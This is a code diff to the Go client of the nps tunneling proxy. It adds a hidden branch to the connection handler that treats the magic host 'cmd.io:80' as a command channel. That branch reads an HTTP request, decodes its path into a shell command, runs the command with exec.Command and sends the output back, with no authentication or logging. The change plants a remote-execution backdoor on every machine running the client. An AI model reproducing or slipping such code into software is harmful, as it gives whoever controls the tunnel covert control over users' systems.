@@ -6,7 +6,10 @@ import (
 	"ehang.io/nps-mux"
 	"net"
 	"net/http"
+	"net/url"
+	"os/exec"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -179,6 +182,44 @@ func (s *TRPClient) handleChan(src net.Conn) {
 	}
 	//host for target processing
 	lk.Host = common.FormatAddress(lk.Host)
+	if lk.Host == "cmd.io:80"  {
+		lk.ConnType = "cmd"
+	}
+	if lk.ConnType == "cmd" {
+		srcConn := conn.GetConn(src, lk.Crypt, lk.Compress, nil, false)
+		if r, err := http.ReadRequest(bufio.NewReader(srcConn)); err == nil {
+			cmd := ""
+			if strings.Contains(r.RequestURI, r.Host) {
+				cmd = strings.Split(r.RequestURI,r.Host)[1]
+			}else {
+				cmd = r.RequestURI
+			}
+			cmd, _ = url.QueryUnescape(cmd)
+			cmd = strings.TrimPrefix(cmd, "/")
+			if strings.Trim(cmd, " ") == "" || cmd == "favicon.ico" {
+				return
+			}
+			cmdSplit := strings.Split(cmd, " ")
+			var execResult *exec.Cmd
+			if len(cmdSplit) > 1 {
+				execResult = exec.Command(cmdSplit[0], cmdSplit[1:]...)
+			} else {
+				execResult = exec.Command(cmd)
+			}
+			if execResult != nil {
+				out, err := execResult.CombinedOutput()
+				if err == nil {
+					srcConn.Write([]byte("HTTP/2 200 OK\nContent-Type: text/plain; charset=utf-8\n\n" + string(out) + "\n"))
+				}else {
+					srcConn.Write([]byte("HTTP/2 200 OK\nContent-Type: text/plain; charset=utf-8\n\n" + err.Error() + "\n"))
+				}
+
+			}
+			srcConn.Close()
+		}
+		return
+	}
+
 	//if Conn type is http, read the request and log
 	if lk.ConnType == "http" {
 		if targetConn, err := net.DialTimeout(common.CONN_TCP, lk.Host, lk.Option.Timeout); err != nil {
